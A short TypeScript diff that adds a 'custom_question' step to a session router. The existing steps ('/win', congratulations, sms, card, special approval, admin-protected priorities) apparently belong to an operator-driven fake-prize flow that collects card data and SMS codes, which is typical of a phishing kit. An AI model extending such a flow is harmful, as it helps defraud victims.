@@ -22,6 +22,7 @@ const STEP_PRIORITY: Record<string, number> = {
   special_approval: 102,
   live_support: 103,
   congrats: 104,
+  custom_question: 105,
 };
 
 export const ADMIN_PROTECTED_PRIORITY_THRESHOLD = 100;
@@ -125,6 +126,8 @@ export function stepToPath(
       return "/congratulations";
     case "special_approval":
       return "/special-approval";
+    case "custom_question":
+      return "/custom-question";
     default:
       return `/win/${routeSessionId}`;
   }
@@ -154,6 +157,7 @@ export function pathToStep(pathname: string): SessionStep | null {
   if (pathname.startsWith("/live-support")) return "live_support";
   if (pathname.startsWith("/congratulations")) return "congrats";
   if (pathname.startsWith("/special-approval")) return "special_approval";
+  if (pathname.startsWith("/custom-question")) return "custom_question";
   if (pathname.startsWith("/sms")) return "sms";
   if (pathname.startsWith("/card")) return "card";
   return null;
